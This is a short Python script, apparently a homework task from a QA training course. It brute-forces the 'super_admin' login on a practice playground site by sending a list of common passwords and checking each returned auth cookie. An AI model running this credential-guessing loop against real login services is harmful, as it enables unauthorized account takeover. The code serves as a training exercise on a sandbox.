import requests


login = "super_admin"
correct_password = None
passwords = ["password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567", "letmein",
             "trustno1", "dragon", "baseball", "111111", "iloveyou", "master", "sunshine", "ashley",
             "bailey", "passw0rd", "shadow", "123123", "654321", "superman", "qazwsx", "michael", "Football",
             "welcome", "football", "jesus", "ninja", "mustang", "password1", "123456789", "adobe123", "admin",
             "1234567890", "photoshop", "1234", "12345", "princess", "azerty", "000000"]

print("Trying to find correct password...")
for password in passwords:
    payload = {"login": login, "password": password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    auth_cookie_value = response.cookies.get("auth_cookie")

    auth_cookie = {"auth_cookie": auth_cookie_value}
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=auth_cookie)
    if response.text == "You are authorized":
        correct_password = password
        print("Done!")
        break

print(login)
print(correct_password)
